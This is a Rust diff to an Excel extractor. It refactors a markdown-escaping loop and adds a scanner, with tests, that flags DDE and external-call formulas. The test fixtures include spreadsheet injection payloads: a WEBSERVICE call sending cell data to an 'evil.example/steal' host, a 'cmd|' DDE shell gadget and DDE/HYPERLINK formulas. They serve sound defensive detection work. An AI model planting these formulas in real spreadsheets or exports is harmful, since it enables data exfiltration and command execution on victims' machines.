@@ -151,15 +151,12 @@ impl ExcelExtractor {
         let mut out = String::with_capacity(name.len() + 8);
 
         for (i, ch) in name.char_indices() {
-            if i == 0 && matches!(ch, '#' | '>' | '-' | '*' | '+' | '~') {
+            let needs_escape = (i == 0 && matches!(ch, '#' | '>' | '-' | '*' | '+' | '~'))
+                || INLINE_METACHARS.contains(&ch);
+            if needs_escape {
                 out.push('\\');
-                out.push(ch);
-            } else if INLINE_METACHARS.contains(&ch) {
-                out.push('\\');
-                out.push(ch);
-            } else {
-                out.push(ch);
             }
+            out.push(ch);
         }
 
         out
@@ -334,6 +331,11 @@ impl ExcelExtractor {
 
         // Transfer revision headers extracted from xl/revisions/revisionHeaders.xml.
         doc.revisions = workbook.revisions.clone();
+
+        // Scan for DDE / external-call formulas and attach any warnings found.
+        for warning in scan_for_dde_warnings(workbook) {
+            doc.processing_warnings.push(warning);
+        }
 
         doc
     }
@@ -743,6 +745,142 @@ mod tests {
         assert_eq!(pages[0].sheet_name.as_deref(), Some("Z"));
         assert_eq!(pages[1].sheet_name.as_deref(), Some("A"));
         assert_eq!(pages[2].sheet_name.as_deref(), Some("M"));
+    }
+
+    // ---- DDE / external-call formula scanning tests --------------------------
+
+    fn make_dde_workbook(cell_value: &str) -> ExcelWorkbook {
+        // Single sheet "Sheet1" with the given cell at R1C1.
+        make_workbook(vec![make_sheet(
+            "Sheet1",
+            Some(vec![vec![cell_value.to_string()]]),
+        )])
+    }
+
+    #[test]
+    fn test_dde_formula_emits_warning() {
+        let workbook = make_dde_workbook("=DDE(\"winword\",\"c:\\test.doc\",\"All\")");
+        let warnings = scan_for_dde_warnings(&workbook);
+        assert_eq!(warnings.len(), 1, "exactly one DDE warning expected");
+        assert!(
+            warnings[0].message.contains("DDE"),
+            "warning must name the formula kind: {}",
+            warnings[0].message
+        );
+        assert!(
+            warnings[0].message.contains("R1C1"),
+            "warning must include cell coordinate: {}",
+            warnings[0].message
+        );
+        assert_eq!(warnings[0].source, "excel_dde_scan");
+    }
+
+    #[test]
+    fn test_webservice_formula_emits_warning() {
+        let workbook = make_dde_workbook("=WEBSERVICE(\"https://evil.example/steal?data=\"&A1)");
+        let warnings = scan_for_dde_warnings(&workbook);
+        assert_eq!(warnings.len(), 1);
+        assert!(
+            warnings[0].message.contains("WEBSERVICE"),
+            "{}",
+            warnings[0].message
+        );
+    }
+
+    #[test]
+    fn test_hyperlink_formula_emits_warning() {
+        let workbook = make_dde_workbook("=HYPERLINK(\"https://evil.example\",\"click me\")");
+        let warnings = scan_for_dde_warnings(&workbook);
+        assert_eq!(warnings.len(), 1);
+        assert!(
+            warnings[0].message.contains("HYPERLINK"),
+            "{}",
+            warnings[0].message
+        );
+    }
+
+    #[test]
+    fn test_cmd_pipe_formula_emits_warning() {
+        // Classic CSV injection via DDE cmd shell gadget.
+        let workbook = make_dde_workbook("=cmd|' /c calc'!A0");
+        let warnings = scan_for_dde_warnings(&workbook);
+        assert_eq!(warnings.len(), 1);
+        assert!(
+            warnings[0].message.contains("ExternalCall"),
+            "{}",
+            warnings[0].message
+        );
+    }
+
+    #[test]
+    fn test_benign_formula_string_no_warning() {
+        // Calamine sometimes emits bare formula text for SUM/AVERAGE etc.
+        // These must not produce warnings.
+        for safe in &["=SUM(A1:A2)", "=AVERAGE(B:B)", "hello world", "42", ""] {
+            let workbook = make_dde_workbook(safe);
+            let warnings = scan_for_dde_warnings(&workbook);
+            assert!(
+                warnings.is_empty(),
+                "unexpected DDE warning for safe cell {:?}: {:?}",
+                safe,
+                warnings
+            );
+        }
+    }
+
+    #[test]
+    fn test_dde_warning_cap_at_100() {
+        // Build a single sheet with 200 DDE cells and verify warnings are capped.
+        let cells: Vec<Vec<String>> = (0..200)
+            .map(|i| vec![format!("=DDE(\"app\",\"topic\",\"item{}\")", i)])
+            .collect();
+        let workbook = make_workbook(vec![make_sheet("Big", Some(cells))]);
+        let warnings = scan_for_dde_warnings(&workbook);
+        assert_eq!(
+            warnings.len(),
+            100,
+            "DDE warnings must be capped at 100, got {}",
+            warnings.len()
+        );
+    }
+
+    #[test]
+    fn test_dde_formula_case_insensitive() {
+        // Pattern must fire regardless of case.
+        for variant in &["=dde(\"app\",\"t\",\"i\")", "=DdE(\"a\",\"b\",\"c\")", "=webservice(\"x\")"] {
+            let workbook = make_dde_workbook(variant);
+            let warnings = scan_for_dde_warnings(&workbook);
+            assert_eq!(
+                warnings.len(),
+                1,
+                "case-insensitive match failed for {:?}",
+                variant
+            );
+        }
+    }
+
+    #[test]
+    fn test_workbook_to_internal_document_includes_dde_warnings() {
+        // Verify the integration: workbook_to_internal_document must attach DDE warnings.
+        let workbook = make_workbook(vec![make_sheet(
+            "Injection",
+            Some(vec![
+                vec!["=DDE(\"app\",\"topic\",\"data\")".to_string()],
+                vec!["normal".to_string()],
+            ]),
+        )]);
+        let doc = ExcelExtractor::workbook_to_internal_document(&workbook);
+        let dde_warnings: Vec<_> = doc
+            .processing_warnings
+            .iter()
+            .filter(|w| w.source == "excel_dde_scan")
+            .collect();
+        assert_eq!(dde_warnings.len(), 1, "one DDE warning expected in InternalDocument");
+        assert!(
+            dde_warnings[0].message.contains("DDE"),
+            "{}",
+            dde_warnings[0].message
+        );
     }
 
     #[test]
